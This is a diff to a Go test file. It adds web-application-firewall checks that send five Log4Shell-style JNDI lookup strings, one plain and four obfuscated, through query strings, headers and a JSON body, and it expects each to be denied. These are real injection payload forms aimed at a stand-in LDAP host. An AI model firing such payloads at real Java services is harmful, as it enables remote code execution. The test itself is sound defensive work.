@@ -16,6 +16,7 @@ import (
 	"net/http/httptest"
 	"net/netip"
 	"net/textproto"
+	"net/url"
 	"os"
 	"path/filepath"
 	"strings"
@@ -296,6 +297,27 @@ func TestWAFHardeningRules(t *testing.T) {
 	} {
 		if v := wafRequest(t, e, c.r); !v.Deny || v.Status != c.status {
 			t.Errorf("%s: %+v, want a deny with %d", c.name, v, c.status)
+		}
+	}
+	// The JNDI payload is written to be unrecognisable, so every
+	// obfuscation that reaches the same lookup has to be refused with
+	// the plain one. Each of these is a form seen in the wild.
+	for _, payload := range []string{
+		"${jndi:ldap://x.example.invalid/a}",
+		"${${lower:j}ndi:ldap://x.example.invalid/a}",
+		"${${::-j}${::-n}${::-d}${::-i}:ldap://x.example.invalid/a}",
+		"${jndi:${lower:l}${lower:d}ap://x.example.invalid/a}",
+		"${${env:NOPE:-j}ndi${env:NOPE:-:}${env:NOPE:-l}dap://x.example.invalid/a}",
+	} {
+		for _, r := range []*http.Request{
+			get("/?q=" + url.QueryEscape(payload)),
+			get("/", "X-Api-Version", payload),
+			get("/", "User-Agent", payload),
+			post("/api/orders", "application/json", fmt.Sprintf(`{"note":%q}`, payload)),
+		} {
+			if v := wafRequest(t, e, r); !v.Deny || v.Status != 403 {
+				t.Errorf("%s through %s %s: %+v, want a deny with 403", payload, r.Method, r.URL, v)
+			}
 		}
 	}
 	// A template expression scores rather than denies on its own, so one
